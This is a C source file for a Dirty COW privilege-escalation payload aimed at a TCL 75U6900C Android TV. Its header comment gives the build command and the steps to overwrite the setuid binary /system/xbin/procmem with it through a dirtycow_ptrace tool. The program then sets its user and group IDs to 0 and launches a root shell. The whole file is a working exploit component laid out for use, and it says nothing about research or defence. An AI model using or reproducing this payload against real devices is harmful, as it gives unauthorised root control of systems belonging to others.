/*
 * Dirty COW payload for TCL 75U6900C (arm64, Android 6).
 * Overwrite the setuid /system/xbin/procmem with this binary; executing it
 * then gives a uid 0 shell:
 *   ./dirtycow_ptrace rootsh2 /system/xbin/procmem --no-pad
 *   /system/xbin/procmem
 *
 * Build:
 *   aarch64-linux-android23-clang -O2 -o rootsh2 rootsh2.c
 */
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    execl("/system/bin/sh", "sh", (char *)0);
    return 1;
}
